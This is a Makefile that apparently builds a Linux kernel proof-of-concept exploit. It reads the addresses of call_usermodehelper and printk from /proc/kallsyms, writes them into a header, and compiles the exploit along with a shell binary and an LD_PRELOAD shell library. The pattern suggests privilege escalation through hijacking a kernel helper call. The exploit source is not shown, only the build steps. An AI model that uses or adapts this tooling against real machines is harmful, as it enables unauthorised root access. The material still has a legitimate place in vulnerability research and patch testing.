SYMLIST = call_usermodehelper|printk

.PHONY: all
all: poc.c ../shell/shell.c ../shell/shell_preload.c
	sudo grep -w -E '($(SYMLIST))' /proc/kallsyms | awk '{printf("#define X_%s 0x%s\n", $$3, $$1)}' >poc.h
	echo "#define SHELL \"$(CURDIR)/shell\"" >>poc.h
	echo "#define LD_PRELOAD_SHELL \"LD_PRELOAD=$(CURDIR)/shell_preload.so\"" >>poc.h
	gcc ../shell/shell_preload.c -o shell_preload.so -I$(CURDIR) -shared -fPIC
	gcc ../shell/shell.c -o shell
	gcc poc.c -o poc

.PHONY: clean
clean:
	rm -f poc shell shell_preload.so poc.h
